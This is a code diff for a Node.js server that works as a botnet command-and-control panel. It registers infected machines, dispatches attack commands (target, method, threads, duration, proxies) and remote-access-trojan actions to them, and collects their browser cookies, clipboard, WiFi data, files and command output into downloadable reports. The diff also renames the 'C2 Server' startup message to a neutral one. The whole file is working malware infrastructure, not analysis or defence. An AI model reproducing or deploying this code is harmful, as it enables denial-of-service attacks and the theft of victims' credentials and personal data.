@@ -10,12 +10,10 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 app.use('/methods', express.static('methods'));
 
-// ===== DỮ LIỆU =====
 let bots = {};
 let pendingCommands = {};
 let infoData = {};
 
-// ===== DỌN BOT CHẾT =====
 setInterval(() => {
     let now = new Date();
     for (let id in bots) {
@@ -26,7 +24,6 @@ setInterval(() => {
     }
 }, 10000);
 
-// ===== BOT ĐĂNG KÝ =====
 app.post('/api/register', (req, res) => {
     const { id, hostname, ip } = req.body;
     for (let oldId in bots) {
@@ -40,10 +37,10 @@ app.post('/api/register', (req, res) => {
         online: true, status: 'ONLINE', target: '', method: '',
         cpu: 0, ram: 0, gpu: 'Unknown', cookies: '', lastSeen: new Date()
     };
+    console.log('Bot registered:', hostname);
     res.json({ ok: true });
 });
 
-// ===== BOT CHECK LỆNH =====
 app.post('/api/check', (req, res) => {
     const { id } = req.body;
     if (bots[id]) { bots[id].lastSeen = new Date(); bots[id].online = true; }
@@ -52,7 +49,6 @@ app.post('/api/check', (req, res) => {
     res.json(cmd || { action: 'none' });
 });
 
-// ===== BOT BÁO CÁO =====
 app.post('/api/report', (req, res) => {
     const { id, status, target, method } = req.body;
     if (bots[id]) {
@@ -64,28 +60,36 @@ app.post('/api/report', (req, res) => {
     res.json({ ok: true });
 });
 
-// ===== BOT BÁO CÁO THÔNG TIN =====
 app.post('/api/reportinfo', (req, res) => {
     const { id, cpu, ram, gpu, cookies, browsers } = req.body;
+    console.log('ReportInfo from:', id, 'CPU:', cpu, 'RAM:', ram);
     if (bots[id]) {
-        bots[id].cpu = cpu || 0; bots[id].ram = ram || 0;
-        bots[id].gpu = gpu || 'Unknown'; bots[id].cookies = cookies || '';
-        bots[id].browsers = browsers || ''; bots[id].lastSeen = new Date();
+        bots[id].cpu = parseInt(cpu) || 0;
+        bots[id].ram = parseInt(ram) || 0;
+        bots[id].gpu = gpu || 'Unknown';
+        bots[id].cookies = cookies || '';
+        bots[id].browsers = browsers || '';
+        bots[id].lastSeen = new Date();
     }
-    infoData[id] = { id, cpu, ram, gpu, cookies, browsers, time: new Date().toISOString() };
+    if (!infoData[id]) infoData[id] = {};
+    infoData[id].cpu = parseInt(cpu) || 0;
+    infoData[id].ram = parseInt(ram) || 0;
+    infoData[id].gpu = gpu || 'Unknown';
+    infoData[id].cookies = cookies || '';
+    infoData[id].browsers = browsers || '';
+    infoData[id].time = new Date().toISOString();
     res.json({ ok: true });
 });
 
-// ===== PANEL GỬI LỆNH TẤN CÔNG =====
 app.post('/api/attack', (req, res) => {
     const { botId, method, target, threads, duration, proxyFile } = req.body;
     const cmd = { action: 'attack', method, target, threads: parseInt(threads)||100, duration: parseInt(duration)||60, proxyFile: proxyFile||'' };
     if (botId === 'ALL') pendingCommands['ALL'] = cmd;
     else if (botId) pendingCommands[botId] = cmd;
-    res.json({ ok: true, cmd });
+    console.log('Attack:', botId, method, target);
+    res.json({ ok: true });
 });
 
-// ===== PANEL DỪNG TẤN CÔNG =====
 app.post('/api/stop', (req, res) => {
     const { botId } = req.body;
     if (botId === 'ALL') pendingCommands['ALL'] = { action: 'stop' };
@@ -93,67 +97,86 @@ app.post('/api/stop', (req, res) => {
     res.json({ ok: true });
 });
 
-// ===== LẤY THÔNG TIN BOT =====
 app.post('/api/getinfo', (req, res) => {
     const { botId } = req.body;
-    if (botId === 'ALL') pendingCommands['ALL'] = { action: 'getinfo' };
-    else if (botId) pendingCommands[botId] = { action: 'getinfo' };
+    const cmd = { action: 'getinfo' };
+    if (botId === 'ALL') pendingCommands['ALL'] = cmd;
+    else if (botId) pendingCommands[botId] = cmd;
+    console.log('GetInfo:', botId);
     res.json({ ok: true });
 });
 
-// ===== TẢI FILE THÔNG TIN =====
 app.get('/api/downloadinfo/:id', (req, res) => {
     const id = req.params.id;
-    const bot = bots[id]; const info = infoData[id] || {};
+    const bot = bots[id];
+    const info = infoData[id] || {};
     if (!bot) return res.status(404).send('Bot not found');
-    let txt = `╔══════════════════════════════════════╗\n║     BOT INFORMATION REPORT           ║\n╚══════════════════════════════════════╝\n\n`;
-    txt += `Bot ID:        ${id}\nHostname:      ${bot.hostname}\nIP Address:    ${bot.ip}\nStatus:        ${bot.status}\nLast Seen:     ${bot.lastSeen}\n\n`;
-    txt += `─── SYSTEM INFO ───\nCPU:           ${info.cpu||'N/A'}%\nRAM:           ${info.ram||'N/A'}%\nGPU:           ${info.gpu||'N/A'}\n\n`;
-    txt += `─── BROWSER DATA ───\nBrowsers:      ${info.browsers||'N/A'}\n\n─── COOKIES ───\n${info.cookies||'No cookies'}\n\n─── TIMESTAMP ───\nReport Time:   ${info.time||'N/A'}\n`;
+    
+    let txt = '========================================\n';
+    txt += '    BOT INFORMATION REPORT\n';
+    txt += '========================================\n\n';
+    txt += 'Bot ID:        ' + id + '\n';
+    txt += 'Hostname:      ' + (bot.hostname||'N/A') + '\n';
+    txt += 'IP Address:    ' + (bot.ip||'N/A') + '\n';
+    txt += 'Status:        ' + (bot.status||'N/A') + '\n';
+    txt += 'Last Seen:     ' + (bot.lastSeen||'N/A') + '\n\n';
+    txt += '--- SYSTEM INFO ---\n';
+    txt += 'CPU:           ' + (info.cpu||bot.cpu||0) + '%\n';
+    txt += 'RAM:           ' + (info.ram||bot.ram||0) + '%\n';
+    txt += 'GPU:           ' + (info.gpu||bot.gpu||'N/A') + '\n\n';
+    txt += '--- BROWSER DATA ---\n';
+    txt += 'Browsers:      ' + (info.browsers||'N/A') + '\n\n';
+    txt += '--- COOKIES ---\n';
+    txt += (info.cookies||'No cookies collected') + '\n\n';
+    txt += '--- RAT DATA ---\n';
+    txt += 'Clipboard:     ' + (info.rat_clipboard||'N/A') + '\n';
+    txt += 'WiFi:          ' + (info.rat_wifi||'N/A') + '\n';
+    txt += 'Files:         ' + (info.rat_files||'N/A') + '\n';
+    txt += 'System Info:   ' + (info.rat_sysinfo||'N/A') + '\n';
+    txt += 'CMD Result:    ' + (info.rat_cmd_result||'N/A') + '\n\n';
+    txt += '--- TIMESTAMP ---\n';
+    txt += 'Report Time:   ' + (info.time||'N/A') + '\n';
+    
     res.setHeader('Content-Type', 'text/plain');
-    res.setHeader('Content-Disposition', `attachment; filename=bot_${bot.hostname}_${id.substring(0,8)}.txt`);
+    res.setHeader('Content-Disposition', 'attachment; filename=bot_' + (bot.hostname||'unknown') + '.txt');
     res.send(txt);
 });
 
-// ===== RAT: GỬI LỆNH =====
 app.post('/api/rat', (req, res) => {
     const { botId, action, params } = req.body;
     const cmd = { action: 'rat', ratAction: action, params: params || '' };
     if (botId === 'ALL') pendingCommands['ALL'] = cmd;
     else if (botId) pendingCommands[botId] = cmd;
+    console.log('RAT command:', botId, action);
     res.json({ ok: true });
 });
 
-// ===== RAT: NHẬN DỮ LIỆU =====
 app.post('/api/ratdata', (req, res) => {
     const { id, type, data } = req.body;
+    console.log('RAT data from:', id, 'type:', type, 'len:', data?data.length:0);
     if (!infoData[id]) infoData[id] = {};
-    infoData[id]['rat_' + type] = data;
+    infoData[id]['rat_' + type] = data || '';
     infoData[id].time = new Date().toISOString();
     if (bots[id]) bots[id].lastSeen = new Date();
     res.json({ ok: true });
 });
 
-// ===== RAT: TẢI DỮ LIỆU =====
 app.get('/api/ratdata/:id/:type', (req, res) => {
     const id = req.params.id;
     const type = 'rat_' + req.params.type;
     const data = infoData[id] ? infoData[id][type] : null;
-    if (!data) return res.json({ error: 'No data' });
-    res.json({ id, type, data });
+    res.json({ id, type, data: data || 'Chưa có dữ liệu' });
 });
 
-// ===== DANH SÁCH BOT =====
 app.get('/api/bots', (req, res) => {
     let online = {};
     for (let id in bots) if (bots[id].online) online[id] = bots[id];
     res.json(online);
 });
 
-// ===== PANEL HTML =====
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'panel.html'));
 });
 
 const PORT = process.env.PORT || 10000;
-server.listen(PORT, () => console.log('C2 Server running on port ' + PORT));
+server.listen(PORT, () => console.log('Server running on port ' + PORT));
